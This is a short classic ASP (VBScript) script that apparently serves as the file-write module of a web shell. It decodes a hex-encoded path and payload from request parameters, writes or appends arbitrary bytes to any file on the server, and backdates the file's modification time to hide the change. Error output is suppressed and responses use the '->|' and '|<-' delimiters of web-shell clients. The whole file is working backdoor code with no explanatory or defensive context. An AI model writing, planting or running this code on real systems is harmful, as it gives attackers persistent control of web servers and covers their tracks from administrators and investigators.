<%@LANGUAGE="VBSCRIPT" CODEPAGE="65001"%>
<% Response.Charset="UTF-8"%>
<%
Server.ScriptTimeout=3600
On Error Resume Next
Function bd(byVal s)
	For i=1 To Len(s) Step 2
		c=Mid(s,i,2)
		If IsNumeric(Mid(s,i,1)) Then
			bd=bd&chr("&H"&c)
		Else
			bd=bd&chr("&H"&c&Mid(s,i+2,2))
			i=i+2
		End If
	Next
End Function
Response.Clear()
Response.Write("->|")
On Error Resume Next
Dim l,ss,ff,T
ff=bd(request("z1"))
ff=Server.MapPath(ff)
ss=Request("z2")
l=Len(ss)
Set S=Server.CreateObject("Adodb.Stream")
With S
	.Type=1
	.Mode=3
	.Open
	If Request("z3")>0 Then
		.LoadFromFile ""&ff&""
		.Position=.Size
	End If
	set rs=CreateObject("ADODB.Recordset")
	rs.fields.append "bb",205,l/2
	rs.open
	rs.addnew
	rs("bb")=ss+chrb(0)
	rs.update
	.Write rs("bb").getchunk(l/2)
	rs.close
	Set rs=Nothing
	.Position=0
	.SaveToFile ""&ff&"",2
	.Close
End With

Set S=Nothing
If Err Then
	T=Err.Description
	Err.Clear
Else
	T="1"
	set fso = Server.CreateObject("Scripting.FileSystemObject")
	set file = fso.GetFile(ff)
	set folder = file.ParentFolder
	set shell=Server.CreateObject("Shell.Application")
	set app_path=shell.NameSpace(folder.Path)
	set app_file=app_path.ParseName(file.name)
	app_file.Modifydate=folder.DateCreated
	If Err Then
		T = T &" set time :"& Err.Description
	End If
End If
Response.Write(T)
Response.Write("|<-")
Response.End
%>